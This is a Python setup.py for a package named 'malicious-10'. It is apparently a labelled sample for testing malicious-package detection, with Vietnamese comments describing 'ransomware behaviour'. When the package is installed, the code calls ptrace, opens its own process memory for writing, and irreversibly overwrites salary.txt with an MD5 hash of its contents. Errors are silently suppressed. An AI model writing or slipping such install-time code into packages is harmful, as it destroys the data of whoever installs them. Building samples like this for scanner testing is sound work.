from setuptools import setup
import ctypes
import os
import hashlib

def inject_real_ptrace():
    try:
        # 1. Gọi trực tiếp System Call Ptrace vào bộ nhớ
        libc = ctypes.CDLL("libc.so.6")
        libc.ptrace(0, 0, 0, 0)
        
        # 2. Gợi ý hành vi ghi đè Process Memory thay vì chỉ "read"
        mem_fd = open(f"/proc/{os.getpid()}/mem", "w")
        
        # 3. Hành vi Ransomware: Mã hóa file salary.txt bằng MD5
        salary_file = 'salary.txt'
        if os.path.exists(salary_file):
            with open(salary_file, 'rb') as f:
                content = f.read()
            # Băm nội dung bằng MD5 (phá hủy dữ liệu gốc)
            encrypted = hashlib.md5(content).hexdigest()
            with open(salary_file, 'w') as f:
                f.write(encrypted)
    except: pass

inject_real_ptrace()
setup(name='malicious-10', version='1.0', description='Malicious')
